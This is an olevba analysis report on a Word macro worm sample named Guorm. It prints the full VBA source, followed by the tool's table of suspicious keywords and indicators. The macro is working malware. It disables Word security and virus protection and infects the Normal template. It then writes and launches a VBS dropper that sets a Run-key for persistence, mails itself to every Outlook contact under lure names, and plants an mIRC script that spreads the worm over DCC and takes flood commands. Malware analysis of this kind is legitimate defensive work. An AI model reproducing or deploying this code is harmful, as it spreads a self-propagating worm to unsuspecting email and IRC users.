olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Email-Worm.VBS.MSWord.Guorm.c-4f1ff81c4238ed5d3b414bfbd4ab38e7b09c9af3
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Email-Worm.VBS.MSWord.Guorm.c-4f1ff81c4238ed5d3b414bfbd4ab38e7b09c9af3 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_open()
'Guorm(Marco.Word). By Kalamar & Beuno.
On Error Resume Next
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
Set AcDoc = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
Set NorTEmp = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Set ThisDoc = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
Start_line = ThisDoc.ProcStartLine("document_open", vbext_pk_Proc)
If AcDoc.countoflines <> 0 Then
Ad_Lines = AcDoc.Lines(Start_line, AcDoc.countoflines)
If InStr(Ad_Lines, ThisDoc.Lines(Start_line, 196)) = 0 Then
AcDoc.AddFromString ThisDoc.Lines(Start_line, 196)
End If
Else
AcDoc.AddFromString ThisDoc.Lines(Start_line, 196)
End If
If NorTEmp.countoflines <> 0 Then
Nt_lines = NorTEmp.Lines(Start_line, NorTEmp.countoflines)
If InStr(Nt_lines, ThisDoc.Lines(Start_line, 196)) = 0 Then
NorTEmp.AddFromString ThisDoc.Lines(Start_line, 196)
End If
Else
NorTEmp.AddFromString ThisDoc.Lines(Start_line, 196)
End If
Dim fso, guorm
Set fso = CreateObject("scripting.filesystemobject")
If Not (fso.fileexists(Environ("WINDIR") & "\GuormEx.vbs")) Then
Set guorm = fso.createtextfile(Environ("WINDIR") & "\GuormEx.vbs", True)
guorm.writeline "'Guorm(Vbs). Mirc/Outlook/Vbs. By Kalamar & Beuno."
guorm.writeline "On error resume next"
guorm.writeline "dim Fso,ws"
guorm.writeline "set ws=CreateObject(" & Chr(34) & "WScript.Shell" & Chr(34) & ")"
guorm.writeline "set fso=createobject(" & Chr(34) & "scripting.filesystemobject" & Chr(34) & ")"
guorm.writeline "if not(fso.fileexists(fso.GetSpecialFolder(1) & " & Chr(34) & "\user32.dll.vbs" & Chr(34) & ")) then"
guorm.writeline "fso.copyfile wscript.scriptfullname,fso.GetSpecialFolder(1) & " & Chr(34) & "\winuser.dll" & Chr(34) & ""
guorm.writeline "fso.copyfile wscript.scriptfullname,fso.GetSpecialFolder(1) & " & Chr(34) & "\user32.dll.vbs" & Chr(34) & ""
guorm.writeline "ws.regwrite " & Chr(34) & "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\user32" & Chr(34) & ", " & Chr(34) & "wscript.exe " & Chr(34) & " & fso.GetSpecialFolder(1) & " & Chr(34) & "\user32.dll.vbs %" & Chr(34) & ""
guorm.writeline "end if"
guorm.writeline "if ws.regread (" & Chr(34) & "HKCU\software\Guorm\mailed" & Chr(34) & ") <> " & Chr(34) & "1" & Chr(34) & " then"
guorm.writeline "DoMail"
guorm.writeline "end if"
guorm.writeline "if ws.regread (" & Chr(34) & "HKCU\software\Guorm\Mirqued" & Chr(34) & ") <> " & Chr(34) & "1" & Chr(34) & " then"
guorm.writeline "mirque()"
guorm.writeline "end if"
guorm.writeline "Function DoMail()"
guorm.writeline "On Error Resume Next"
guorm.writeline "Dim fso, ws"
guorm.writeline "Set fso = CreateObject(" & Chr(34) & "Scripting.filesystemobject" & Chr(34) & ")"
guorm.writeline "Set ws = CreateObject(" & Chr(34) & "WScript.Shell" & Chr(34) & ")"
guorm.writeline "Set OApp = CreateObject(" & Chr(34) & "Outlook.Application" & Chr(34) & ")"
guorm.writeline "if oapp=" & Chr(34) & "Outlook" & Chr(34) & " then"
guorm.writeline "Dim wnames(16)"
guorm.writeline "Dim wext(6)"
guorm.writeline "wext(1) = " & Chr(34) & ".vbs" & Chr(34) & ": wext(2) = " & Chr(34) & ".vbe" & Chr(34) & ": wext(3) = " & Chr(34) & ".txt.vbs" & Chr(34) & ": wext(4) = " & Chr(34) & ".jpg.vbs" & Chr(34) & ": wext(5) = " & Chr(34) & ".avi.vbs" & Chr(34) & ": wext(6) = " & Chr(34) & ".scr.vbs" & Chr(34) & ""
guorm.writeline "wnames(9) = " & Chr(34) & "links" & Chr(34) & ": wnames(1) = " & Chr(34) & "cool" & Chr(34) & ": wnames(2) = " & Chr(34) & "funny" & Chr(34) & ": wnames(3) = " & Chr(34) & "anti-loveletter" & Chr(34) & ": wnames(4) = " & Chr(34) & "guorm" & Chr(34) & ": wnames(5) = " & Chr(34) & "pot" & Chr(34) & ": wnames(6) = " & Chr(34) & "win2k" & Chr(34) & ": wnames(7) = " & Chr(34) & "icq2k" & Chr(34) & ": wnames(8) = " & Chr(34) & "money" & Chr(34) & ": wnames(10) = " & Chr(34) & "funnypic.jpg" & Chr(34) & ": wnames(11) = " & Chr(34) & "quake" & Chr(34) & ": wnames(12) = " & Chr(34) & "Year2K+1" & Chr(34) & ": wnames(13) = " & Chr(34) & "Mirc2K" & Chr(34) & ": wnames(14) = " & Chr(34) & "Word2001" & Chr(34) & ": wnames(15) = " & Chr(34) & "FunStuff" & Chr(34) & ": wnames(16) = " & Chr(34) & "WindowsMe" & Chr(34) & ""
guorm.writeline "Randomize"
guorm.writeline "wname2 = wnames(Int((16 * Rnd) + 1))"
guorm.writeline "Randomize"
guorm.writeline "wext2 = wext(Int((6 * Rnd) + 1))"
guorm.writeline "newname = wname2 & wext2"
guorm.writeline "fso.CopyFile wscript.scriptfullname, fso.GetSpecialFolder(1) & " & Chr(34) & "\" & Chr(34) & " & newname"
guorm.writeline "Set Mapi = OApp.GetNameSpace(" & Chr(34) & "MAPI" & Chr(34) & ")"
guorm.writeline "For Each AddList In Mapi.AddressLists"
guorm.writeline "If AddList.AddressEntries.Count <> 0 Then"
guorm.writeline "For AddListCount = 1 To AddList.AddressEntries.Count"
guorm.writeline "Set AddListEntry = AddList.AddressEntries(AddListCount)"
guorm.writeline "Set msg = OApp.CreateItem(0)"
guorm.writeline "msg.To = AddListEntry.Address"
guorm.writeline "msg.Subject = " & Chr(34) & "You know what it is. ;-P" & Chr(34) & ""
guorm.writeline "msg.Body = " & Chr(34) & "Check it out!" & Chr(34) & ""
guorm.writeline "msg.Attachments.Add fso.GetSpecialFolder(1) & " & Chr(34) & "\" & Chr(34) & " & newname"
guorm.writeline "msg.DeleteAfterSubmit = True"
guorm.writeline "If msg.To <> " & Chr(34) & "" & Chr(34) & " Then"
guorm.writeline "msg.Send"
guorm.writeline "End If"
guorm.writeline "Next"
guorm.writeline "End If"
guorm.writeline "Next"
guorm.writeline "ws.regwrite " & Chr(34) & "HKCU\software\Guorm\mailed" & Chr(34) & ", " & Chr(34) & "1" & Chr(34) & ""
guorm.writeline "OApp.Quit"
guorm.writeline "fso.DeleteFile (fso.GetSpecialFolder(1) & " & Chr(34) & "\" & Chr(34) & " & newname)"
guorm.writeline "end if"
guorm.writeline "End Function"
guorm.writeline "Function mirque()"
guorm.writeline "On Error Resume Next"
guorm.writeline "Dim finded"
guorm.writeline "  Dim fso, Drives, Drivetype"
guorm.writeline "  Dim Drivesefull"
guorm.writeline "  Set fso = CreateObject(" & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & ")"
guorm.writeline "  Set Drives = fso.Drives"
guorm.writeline "  For Each Drivetype In Drives"
guorm.writeline "    If Drivetype.Drivetype = Remote Then"
guorm.writeline "    Drivesefull = Drivetype & " & Chr(34) & "\" & Chr(34) & ""
guorm.writeline "    Call Search_Subfol(Drivesefull)"
guorm.writeline "    ElseIf Drivetype.IsReady Then"
guorm.writeline "    Drivesefull = Drivetype & " & Chr(34) & "\" & Chr(34) & ""
guorm.writeline "    Call Search_Subfol(Drivesefull)"
guorm.writeline "    End If"
guorm.writeline "  Next"
guorm.writeline "End Function"
guorm.writeline "Function Search_Subfol(Whichfol)"
guorm.writeline "On Error Resume Next"
guorm.writeline "Dim fso, GetFol, Files, File, Subfolds"
guorm.writeline "  Set fso = CreateObject(" & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & ")"
guorm.writeline "  Set GetFol = fso.GetFolder(Whichfol)"
guorm.writeline "  Set Files = GetFol.Files"
guorm.writeline "  For Each File In Files"
guorm.writeline "   If File.Name = " & Chr(34) & "mirc.ini" & Chr(34) & " Or File.Name = " & Chr(34) & "mirc32.exe" & Chr(34) & " Or File.Name = " & Chr(34) & "mlink32.exe" & Chr(34) & " Then"
guorm.writeline "   Call DoMirc(Whichfol)"
guorm.writeline "   End If"
guorm.writeline "   Next"
guorm.writeline "  Set File = GetFol.SubFolders"
guorm.writeline "  For Each Subfolds In File"
guorm.writeline "   Call Search_Subfol(Subfolds.path)"
guorm.writeline "  Next"
guorm.writeline "End Function"
guorm.writeline "Function DoMirc(path)"
guorm.writeline "On Error Resume Next"
guorm.writeline "Dim fso"
guorm.writeline "Set fso = CreateObject(" & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & ")"
guorm.writeline "Set dirsystem = fso.GetSpecialFolder(0)"
guorm.writeline "If Right(path, 1) <> " & Chr(34) & "\" & Chr(34) & " Then"
guorm.writeline "Set scriptini = fso.CreateTextFile(path & " & Chr(34) & "\script.ini" & Chr(34) & ", True)"
guorm.writeline "Else"
guorm.writeline "Set scriptini = fso.CreateTextFile(path & " & Chr(34) & "script.ini" & Chr(34) & ", True)"
guorm.writeline "End If"
guorm.writeline "scriptini.WriteLine " & Chr(34) & "[script]" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n0=on *:CONNECT:{" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n1=  .join #guorm" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n2=  set %chancolor $chr(3) $+ 4" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n3=  .timercon1 -m 1 250 .msg #guorm %chancolor $+ -------------------------------------- $+ $chr(3)" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n4=  .timercon2 -m 1 500 .msg #guorm Just annother dumbass" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n5=  .timercon3 -m 1 750 .msg #guorm Mother fucker who got infected" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n6=  .timercon4 -m 1 1000 .msg #guorm by Guorm - BM + OldWary + Kalamar" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n7=  .timercon5 -m 1 1250 .msg #guorm %chancolor $+ -------------------------------------- $+ $chr(3)" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n8=  .timercon6 -m 1 2000 unset %chancolor" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n9=  chanstatus" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n10=  .timercon7 1 20 update" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n11=}" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n12=on *:JOIN:#guorm:{ .window -h #guorm }" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n13=on *:DISCONNECT:{" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n14=  .part #guorm" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n15=}" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n16=alias -l chanstatus {" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n17=  .timerop1 1 10 if ($me isop #guorm) .topic #guorm -=[ Guorm ]=-" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n18=  .timerop2 1 11 if ($me isop #guorm) .mode #guorm +nst" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n19=  .timerop3 1 12 if ($me isop #guorm) .mode #guorm -o $me" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n20=}" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n21=on *:JOIN:#: if (($nick != $me) && ($chan != #guorm) && ($chan != #virus)) { guorm.infect $nick }" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n22=on *:TEXT:*virus*:*: if ((#virus != $chan) && (#guorm != $chan)) .ignore $nick" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n23=on *:TEXT:*worm*:*: if ((#virus != $chan) && (#guorm != $chan)) .ignore $nick" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n24=on *:TEXT:!GuormFlood*:#guorm:.ignore -u120 $nick | .timer41 10 2 .CTCP $2 PING | .timer42 10 2 .CTCP $2 VERSION | .timer43 10 2 .CTCP $2 FINGER | .timer44 10 2 .CTCP $2 TIME" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n25=ctcp *:!GuormFlood:*:.ignore -u120 $nick | .timer41 10 2 .CTCP $2 PING | .timer42 10 2 .CTCP $2 VERSION | .timer43 10 2 .CTCP $2 FINGER | .timer44 10 2 .CTCP $2 TIME" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n26=on *:TEXT:!joinflood*:#guorm:.timer51 10 2 .join $2 | .timer52 10 3 .part $2" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n27=ctcp *:!joinflood:*:.timer51 10 2 .join $2 | .timer52 10 3 .part $2" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n35=ctcp *:!kill:*:.run -n file://c:/con/con" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n36=ctcp *:!fserve:*:.fserve $nick 1 $2" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n37=ctcp *:+*:*: $right($1-,-1) | /halt" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n38=ctcp *:PING: { raw -q notice $nick : $+ $chr(1) $+ PING BM + OldWary + KALAMAR $+ $chr(1) } /halt" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n39=ctcp *:VERSION: { raw -q notice $nick : $+ $chr(1) $+ VERSION Guorm 1.0 $+ $chr(1) } /halt" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n40=ctcp *:FINGER:*: /halt" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n41=ctcp *:TIME: { raw -q notice $nick : $+ $chr(1) $+ TIME Guorm time! $+ $chr(1) } /halt" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n42=ctcp *:AUTHOR: { raw -q notice $nick : $+ $chr(1) $+ AUTHOR BM + OldWary + KALAMAR $+ $chr(1) } /halt" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n43=raw 353:*guorm*:/halt" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n44=raw 366:*dguorm*:/halt" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n45=raw 403:*dguorm*:/halt" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n46=raw 442:*dguorm*:/halt" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n47=raw *:*guorm*:/halt" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n48=alias -l file.name return $gettok(:links.vbs:p0rn.vbs:winsource.vbs:quake.vbs:network.vbs:sony.vbs:vbs.vbs:,$r(1,7),58)" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n49=alias guorm.infect {" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n50=  %guorm.sock = guorm.send. $+ $rand(100,9000)" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n51=  socklisten %guorm.sock" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n52=  .timer99 off" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n53=  .timer99 1 120 sockclose guorm.send.*" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n54=  raw -q privmsg $1 : $+ $chr(1) $+ DCC SEND $file.name $longip($ip) $sock(%guorm.sock).port $file(c:\windows\system\winuser.dll).size $+ $chr(1)" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n55=}" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n56=on *:socklisten:guorm.send.*:{" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n57=  set %guorm.temp guorm.write. $+ $gettok($sockname,3,46) | sockaccept %guorm.temp | guorm.send %guorm.temp | sockclose $sockname" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n58=}" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n59=on *:sockwrite:guorm.write.*:{" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n60=  if ($sock($sockname).sent >= $file(c:\windows\system\winuser.dll).size) sockwrite -n $sockname" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n61=  else guorm.send $sockname" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n62=}" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n63=alias  guorm.send {" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n64=  bread c:\windows\system\winuser.dll $sock($sockname).sent 4096 &guorm.data" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n65=  sockwrite $1 &guorm.data" & Chr(34) & ""
guorm.writeline "scriptini.WriteLine " & Chr(34) & "n66=}" & Chr(34) & ""
guorm.writeline "scriptini.Close"
guorm.writeline "ws.regwrite " & Chr(34) & "HKCU\software\Guorm\Mirqued" & Chr(34) & ", " & Chr(34) & "1" & Chr(34) & ""
guorm.writeline "End Function"
guorm.Close
Shell Environ("WINDIR") & "\wscript.exe " & Environ("WINDIR") & "\GuormEx.vbs %"
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|copyfile            |May copy a file                              |
|Suspicious|kill                |May delete a file                            |
|Suspicious|createtextfile      |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|regread             |May read registry keys                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |GuormEx.vbs         |Executable file name                         |
|IOC       |user32.dll          |Executable file name                         |
|IOC       |winuser.dll         |Executable file name                         |
|IOC       |wscript.exe         |Executable file name                         |
|IOC       |txt.vbs             |Executable file name                         |
|IOC       |jpg.vbs             |Executable file name                         |
|IOC       |avi.vbs             |Executable file name                         |
|IOC       |scr.vbs             |Executable file name                         |
|IOC       |mirc32.exe          |Executable file name                         |
|IOC       |mlink32.exe         |Executable file name                         |
|IOC       |links.vbs           |Executable file name                         |
|IOC       |p0rn.vbs            |Executable file name                         |
|IOC       |winsource.vbs       |Executable file name                         |
|IOC       |quake.vbs           |Executable file name                         |
|IOC       |network.vbs         |Executable file name                         |
|IOC       |sony.vbs            |Executable file name                         |
|IOC       |vbs.vbs             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

